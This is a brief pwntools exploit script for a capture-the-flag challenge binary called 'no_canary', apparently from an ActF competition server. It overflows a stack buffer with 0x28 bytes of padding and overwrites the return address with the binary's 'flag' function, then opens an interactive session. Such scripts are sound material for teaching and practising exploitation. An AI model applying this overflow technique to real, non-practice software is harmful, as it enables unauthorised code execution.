from pwn import *

e = ELF("./no_canary")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("shell.actf.co", 20700)
else:
  p = process(e.path)

p.sendline("A" * 0x28 + p64(e.symbols["flag"]))

p.interactive()
